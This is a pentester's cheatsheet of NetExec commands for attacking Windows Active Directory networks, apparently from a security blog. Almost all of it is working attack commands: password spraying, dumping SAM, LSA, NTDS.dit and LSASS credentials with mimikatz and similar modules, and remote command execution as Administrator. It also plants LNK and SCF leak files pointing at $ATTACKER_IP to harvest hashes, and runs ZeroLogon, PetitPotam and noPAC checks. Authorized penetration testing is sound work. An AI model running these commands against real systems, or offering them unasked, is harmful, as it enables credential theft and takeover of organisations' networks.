# NetExec Cheatsheet

[[_TOC_]]

A quick and dirty cheatsheet on the usage of [NetExec](https://github.com/Pennyw0rth/NetExec), without lots of explications, only commands. The purpose of this page is to provide the basic commands for the essential operations during an internal pentest.

If you need more detailed documentation, please refer to the [**official NetExec wiki**](https://www.netexec.wiki/).

And obviously, if you need more complete cheatsheets with most of the attacks to perform in Active Directory environments, take a look to [my other contents](https://hideandsec.sh/books/cheatsheets-82c).

## Enumeration

### Network

`netexec smb $TARGETS`

### Shares

`netexec smb $TARGETS -u $USERNAME -p $PASS --shares`

### Specific files in shares

A module for searching network shares:spider_plus. Running the module without any options (on a /24, for example) will produce a JSON output for each server, containing a list of all files (and some info), but without their contents. Then grep on extensions (conf, ini...) or names ($PASS .. ) to identify an interesting file to search:

`netexec smb $TARGETS -u $USERNAME -p $PASS -M spider_plus`

Then, when identifying a lot of interesting files, to speed up the search, dump this on the attacker machine by adding the -o READ_ONLY=False option after the -M spider_plus (but avoid /24, otherwise it'll take a long time). In this case, NetExec will create a folder with the machine's IP, and all the folders/files in it.

`netexec smb $TARGETS -u $USERNAME -p $PASS -M spider_plus -o READ_ONLY=False`

### Sessions

`netexec $TARGETS -u $USERNAME -p $PASS --sessions`

### Disk

`netexec smb $TARGETS -u $USERNAME -p $PASS --disks`

### Users

Logged : `netexec smb $TARGETS -u $USERNAME -p $PASS --loggedon-users`

Domain : `netexec smb $TARGETS -u $USERNAME -p $PASS --users`

Via RID Cycling : `netexec smb $TARGETS -u $USERNAME -p $PASS --rid-brute`

### Groups

Domain : `netexec smb $TARGETS -u $USERNAME -p $PASS --groups`

Local : `netexec smb $TARGETS -u $USERNAME -p $PASS --local-groups`

### Password policy

`netexec smb $DC -u $USERNAME -p $PASS --pass-pol`

## Check credentials

### User + pass

`netexec smb $TARGETS -u $USERNAME -p $PASS`

### User + hash

`netexec smb $TARGETS -u $USERNAME -H 'LM:NT'`

`netexec smb $TARGETS -u $USERNAME -H 'NTHASH'`

### Null session

`netexec smb $TARGETS -u '' -p ''`

### Password spraying

`netexec smb $TARGET -u $USERNAME user2 user3 -p Summer18`

`netexec smb $TARGET -u $USERNAME -p $PASS1 $PASS2 $PASS3`

`netexec smb $TARGET -u /path/to/users.txt -p Summer18`

`netexec smb $TARGET -u $USERNAME -p /path/to/$PASSs.txt`

To continue spraying after success :

`netexec smb $TARGET -u /path/to/users.txt -p Summer18 --continue-on-success`

### Local authentication

`netexec smb $TARGETS -u $USERNAME -p $PASS --local-auth`

## Dump credentials

### SAM

`netexec smb $TARGETS -u $USERNAME -p $PASS --sam`

### LSA

`netexec smb $TARGETS -u $USERNAME -p $PASS --lsa`

### NTDS.dit

`netexec smb $DC -u $USERNAME -p $PASS --ntds #Via RPC`

`netexec smb $DC -u $USERNAME -p $PASS --ntds vss #Via VSS`

### LSASS

`netexec smb $TARGET -u $USERNAME -p $PASS -M lsassy`

`netexec smb $TARGET -u $USERNAME -p $PASS -M nanodump`

`netexec smb $TARGET -u $USERNAME -p $PASS -M mimikatz`

`netexec smb $TARGET -u $USERNAME -p $PASS -M procdump`

### LAPS password

`netexec ldap $DC -u $TARGET -p $PASS -M laps -o computer=$TARGET`

## Command execution

### Via CMD

`netexec $TARGET -u Administrator -p $PASS -x whoami`

### Via PowerShell

`netexec $TARGET -u Administrator -p $PASS -X '$PSVersionTable'`

## Write a leak file

### LNK

`netexec smb $TARGETS -u $USERNAME -p $PASS -M slinky -o SERVER=$ATTACKER_IP -o NAME=<file_name>`

### SCF

`netexec smb $TARGETS -u $USERNAME -p $PASS -M scuffy -o SERVER=$ATTACKER_IP -o NAME=<file_name>`

## Search for CVE

### ZeroLogon

`netexec smb $DC -u '' -p '' -M zerologon`

### PetitPotam

`netexec smb $DC -u '' -p '' -M petitpotam`

### noPAC

`netexec smb $DC -u $USERNAME -p $PASS -M nopac`
